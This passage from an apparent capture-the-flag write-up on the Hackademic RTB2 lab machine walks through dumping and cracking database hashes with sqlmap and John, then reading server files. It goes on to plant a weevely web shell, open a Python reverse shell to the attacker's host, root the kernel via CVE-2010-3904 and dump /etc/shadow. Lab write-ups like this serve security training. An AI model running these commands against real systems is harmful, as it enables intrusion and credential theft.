</span><span class='line'>localhost,debian-sys-maint,*F36E6519B0B1D62AA2D5346EFAD66D1CAF248996,&lt;blank>,Y,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,Y,&lt;blank>,Y,Y,Y,Y,&lt;blank>,Y,Y,Y,0,Y,Y,0,Y,Y,Y,Y,Y,Y,Y,0,Y
</span><span class='line'>localhost,phpmyadmin,*5D3C124406BF85494067182754131FF4DAB9C6C7,&lt;blank>,N,N,N,N,N,&lt;blank>,N,N,N,0,N,N,N,&lt;blank>,N,N,N,N,&lt;blank>,N,N,N,0,N,N,0,N,N,N,N,N,N,N,0,N
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# cat user-f3649c95.csv | cut -d, -f2-3 | sed 's#,#:#' > hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump/mysql# john --format=mysql-sha1 hashes.csv</span></code></pre></td></tr></table></div></figure>


<p>We parse the Joomla usernames and passwords and crack using John:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv 
</span><span class='line'>id,gid,name,email,block,params,username,usertype,password,sendEmail,activation,registerDate,lastvisitDate
</span><span class='line'>62,25,Administrator,admin@hackademirtb2.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,Administrator,Super Administrator,08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl,1,&lt;blank>,2011-01-17 19:31:21,2011-01-22 16:38:49
</span><span class='line'>63,18,John Smith,JSmith@hackademicrtb.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,JSmith,Registered,992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF,0,&lt;blank>,2011-01-22 10:17:30,2011-01-25 15:02:13
</span><span class='line'>64,18,Billy Tallor,BTallor@hackademic.com,0,admin_language=\nlanguage=\neditor=\nhelpsite=\ntimezone=0\n\n,BTallor,Registered,abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy,0,&lt;blank>,2011-01-22 10:18:06,0000-00-00 00:00:00
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  
</span><span class='line'>username:password
</span><span class='line'>Administrator:08f43b7f40fb0d56f6a8fb0271ec4710$n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
</span><span class='line'>JSmith:992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF
</span><span class='line'>BTallor:abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
</span><span class='line'>
</span><span class='line'>root@kali32:/usr/share/dirb# john --list=subformats
</span><span class='line'>Format = dynamic_0   type = dynamic_0: md5($p) (raw-md5)
</span><span class='line'>Format = dynamic_1   type = dynamic_1: md5($p.$s) (joomla)
</span><span class='line'>Format = dynamic_2   type = dynamic_2: md5(md5($p)) (e107)
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# cat joomla/jos_users.csv | cut -d, -f 7,9 | sed -e 's/:/\$/' -e 's/,/:/'  > /tmp/joomla.pass 
</span><span class='line'>
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1
</span><span class='line'>...
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# john /tmp/joomla.pass  -format=dynamic_1 --show
</span><span class='line'>JSmith:matrix
</span><span class='line'>BTallor:victim
</span><span class='line'>test:test
</span><span class='line'>
</span><span class='line'>3 password hashes cracked, 1 left</span></code></pre></td></tr></table></div></figure>


<p>Because the SQLi statements are executed by database root user, we can read or store arbitrary file to the server.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/passwd
</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/issue</span></code></pre></td></tr></table></div></figure>


<p>The target is Ubuntu 10.04, we can predict better the filenames in /etc:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-read=/etc/phpmyadmin/config.inc.php</span></code></pre></td></tr></table></div></figure>


<p>We generate and upload the weevely shell, then upgrade to python shell over netcat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.150/dump# sqlmap -u "http://192.168.80.150:666/index.php?option=com_abc&view=abc&letter=test"  -p letter --batch --file-write=weevely.php --file-dest=/var/www/test1.php
</span><span class='line'>
</span><span class='line'>root@kali32:/usr/share/exploitdb# nc -lp 1338
</span><span class='line'>
</span><span class='line'>www-data@HackademicRTB2:/tmp $ python -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('/bin/bash')" 192.168.80.137 1338
</span><span class='line'>www-data@HackademicRTB2:/tmp$</span></code></pre></td></tr></table></div></figure>


<p>The following credentials could be used to log in phpMyAdmin using root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">HackademicRTB2</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nx">configuration</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">JConfig</span> <span class="p">{</span>
</span><span class='line'><span class="cm">/* Site Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offline</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offline_message</span> <span class="o">=</span> <span class="s1">&#39;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sitename</span> <span class="o">=</span> <span class="s1">&#39;Hackademic.RTB2&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$editor</span> <span class="o">=</span> <span class="s1">&#39;tinymce&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$list_limit</span> <span class="o">=</span> <span class="s1">&#39;20&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$legacy</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Debug Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$debug</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$debug_lang</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Database Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$dbtype</span> <span class="o">=</span> <span class="s1">&#39;mysql&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$host</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;yUtJklM97W&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$db</span> <span class="o">=</span> <span class="s1">&#39;joomla&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$dbprefix</span> <span class="o">=</span> <span class="s1">&#39;jos_&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Server Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$live_site</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$secret</span> <span class="o">=</span> <span class="s1">&#39;iFzlVUCg9BBPoUDU&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$gzip</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$error_reporting</span> <span class="o">=</span> <span class="s1">&#39;-1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$helpurl</span> <span class="o">=</span> <span class="s1">&#39;http://help.joomla.org&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$xmlrpc_server</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_host</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_port</span> <span class="o">=</span> <span class="s1">&#39;21&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_pass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_root</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$ftp_enable</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$force_ssl</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Locale Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offset</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$offset_user</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Mail Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$mailer</span> <span class="o">=</span> <span class="s1">&#39;mail&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="s1">&#39;admin@hackademirtb2.com&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$fromname</span> <span class="o">=</span> <span class="s1">&#39;Hackademic.RTB2&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sendmail</span> <span class="o">=</span> <span class="s1">&#39;/usr/sbin/sendmail&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpauth</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpsecure</span> <span class="o">=</span> <span class="s1">&#39;none&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpport</span> <span class="o">=</span> <span class="s1">&#39;25&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtpuser</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtppass</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$smtphost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Cache Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$caching</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$cachetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$cache_handler</span> <span class="o">=</span> <span class="s1">&#39;file&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Meta Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaDesc</span> <span class="o">=</span> <span class="s1">&#39;Joomla! - the dynamic portal engine and content management system&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaKeys</span> <span class="o">=</span> <span class="s1">&#39;joomla, Joomla&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaTitle</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$MetaAuthor</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* SEO Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef</span>           <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef_rewrite</span>   <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$sef_suffix</span>    <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Feed Settings */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$feed_limit</span>   <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$feed_email</span>   <span class="o">=</span> <span class="s1">&#39;author&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$log_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/logs&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$tmp_path</span> <span class="o">=</span> <span class="s1">&#39;/var/www/tmp&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cm">/* Session Setting */</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$lifetime</span> <span class="o">=</span> <span class="s1">&#39;15&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">var</span> <span class="nv">$session_handler</span> <span class="o">=</span> <span class="s1">&#39;database&#39;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>We download the <a href="https://github.com/PenturaLabs/Linux_Exploit_Suggester">Linux_Exploit_Suggester.pl</a> and use for finding an exploit for privilege escalation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@HackademicRTB2:/tmp$ perl Linux_Exploit_Suggester.pl
</span><span class='line'>perl Linux_Exploit_Suggester.pl
</span><span class='line'>
</span><span class='line'>Kernel local: 2.6.32
</span><span class='line'>
</span><span class='line'>Searching among 65 exploits...
</span><span class='line'>
</span><span class='line'>Possible Exploits:
</span><span class='line'>[+] american-sign-language
</span><span class='line'>   CVE-2010-4347
</span><span class='line'>   Source: http://www.securityfocus.com/bid/45408/
</span><span class='line'>[+] can_bcm
</span><span class='line'>   CVE-2010-2959
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/14814/
</span><span class='line'>[+] half_nelson
</span><span class='line'>   Alt: econet    CVE-2010-3848
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/6851
</span><span class='line'>[+] half_nelson1
</span><span class='line'>   Alt: econet    CVE-2010-3848
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
</span><span class='line'>[+] half_nelson2
</span><span class='line'>   Alt: econet    CVE-2010-3850
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
</span><span class='line'>[+] half_nelson3
</span><span class='line'>   Alt: econet    CVE-2010-4073
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/17787/
</span><span class='line'>[+] msr
</span><span class='line'>   CVE-2013-0268
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/27297/
</span><span class='line'>[+] pktcdvd
</span><span class='line'>   CVE-2010-3437
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15150/
</span><span class='line'>[+] ptrace_kmod2
</span><span class='line'>   Alt: ia32syscall,robert_you_suck    CVE-2010-3301
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15023/
</span><span class='line'>[+] rawmodePTY
</span><span class='line'>   CVE-2014-0196
</span><span class='line'>   Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
</span><span class='line'>[+] rds
</span><span class='line'>   CVE-2010-3904
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15285/
</span><span class='line'>[+] reiserfs
</span><span class='line'>   CVE-2010-1146
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/12130/
</span><span class='line'>[+] video4linux
</span><span class='line'>   CVE-2010-3081
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15024/</span></code></pre></td></tr></table></div></figure>


<p>We root the server using:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/15285.c
</span><span class='line'>
</span><span class='line'>[+] rds
</span><span class='line'>   CVE-2010-3904
</span><span class='line'>   Source: http://www.exploit-db.com/exploits/15285/</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:$6$YB3puY.G$drg9.SqpJyPujoS82zbwdQtM7xgPpAJlDmdQaH8tu2ndUrmNwIx29lYazyhhsFKKF.yw6ScopFmMAh.t/qIZn0:14999:0:99999:7:::
</span><span class='line'>daemon:*:14837:0:99999:7:::
</span><span class='line'>bin:*:14837:0:99999:7:::
</span><span class='line'>sys:*:14837:0:99999:7:::
</span><span class='line'>sync:*:14837:0:99999:7:::
</span><span class='line'>games:*:14837:0:99999:7:::
</span><span class='line'>man:*:14837:0:99999:7:::
</span><span class='line'>lp:*:14837:0:99999:7:::
</span><span class='line'>mail:*:14837:0:99999:7:::
</span><span class='line'>news:*:14837:0:99999:7:::
</span><span class='line'>uucp:*:14837:0:99999:7:::
</span><span class='line'>proxy:*:14837:0:99999:7:::
</span><span class='line'>www-data:*:14837:0:99999:7:::
</span><span class='line'>backup:*:14837:0:99999:7:::
</span><span class='line'>list:*:14837:0:99999:7:::
</span><span class='line'>irc:*:14837:0:99999:7:::
</span><span class='line'>gnats:*:14837:0:99999:7:::
</span><span class='line'>nobody:*:14837:0:99999:7:::
</span><span class='line'>libuuid:!:14837:0:99999:7:::
</span><span class='line'>syslog:*:14837:0:99999:7:::
</span><span class='line'>messagebus:*:14837:0:99999:7:::
</span><span class='line'>avahi-autoipd:*:14837:0:99999:7:::
</span><span class='line'>avahi:*:14837:0:99999:7:::
</span><span class='line'>couchdb:*:14837:0:99999:7:::
</span><span class='line'>speech-dispatcher:!:14837:0:99999:7:::
</span><span class='line'>usbmux:*:14837:0:99999:7:::
</span><span class='line'>haldaemon:*:14837:0:99999:7:::
</span><span class='line'>kernoops:*:14837:0:99999:7:::
</span><span class='line'>pulse:*:14837:0:99999:7:::
</span><span class='line'>rtkit:*:14837:0:99999:7:::
</span><span class='line'>saned:*:14837:0:99999:7:::
</span><span class='line'>hplip:*:14837:0:99999:7:::
</span><span class='line'>gdm:*:14837:0:99999:7:::
</span><span class='line'>p0wnbox:$6$AT8lMX0W$GPAZaGLMX0mi5EPFhx9wT5qJu9bxkIEfH.cmKX/j/O3QpRWXgBQ2WUAa.SIoFGdcfKrv.FtuBVn1UonfItMrw1:14999:0:99999:7:::
</span><span class='line'>mysql:!:14991:0:99999:7:::
</span><span class='line'>
</span><span class='line'># pwd
</span><span class='line'>pwd
</span><span class='line'>/root
</span><span class='line'># ls -l 
</span><span class='line'>ls -l 
</span><span class='line'>total 40
</span><span class='line'>drwxr-xr-x 2 root root  4096 Jan 17  2011 Desktop
</span><span class='line'>-rwxr-xr-x 1 root root 33921 Jan 22  2011 Key.txt
</span><span class='line'>
</span><span class='line'># cat /etc/knockd.conf
</span><span class='line'>cat /etc/knockd.conf
</span><span class='line'>[options]
</span><span class='line'>        UseSyslog
</span><span class='line'>
</span><span class='line'>[openHTTPD]
</span><span class='line'>        sequence    = 7000,8000,9000
</span><span class='line'>        seq_timeout = 5
</span><span class='line'>        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
</span><span class='line'>        tcpflags    = syn
</span><span class='line'>
</span><span class='line'>[closeHTTPD]
</span><span class='line'>        sequence    = 9000,8000,7000
</span><span class='line'>        seq_timeout = 5
</span><span class='line'>        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
</span><span class='line'>        tcpflags    = syn
</span><span class='line'>
</span><span class='line'>
</span><span class='line'># base64 -d /root/Key.txt > /var/www/key.png
</span><span class='line'>base64 -d /root/Key.txt > /var/www/key.png</span></code></pre></td></tr></table></div></figure>


<p>We can check the flag <a href="http://192.168.80.150:666/key.png">here</a>. As we can see
from output above, there is port-knocking mechanism using sequences 7000,8000,9000.</p>

<p>Finally we want to see the check.php source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
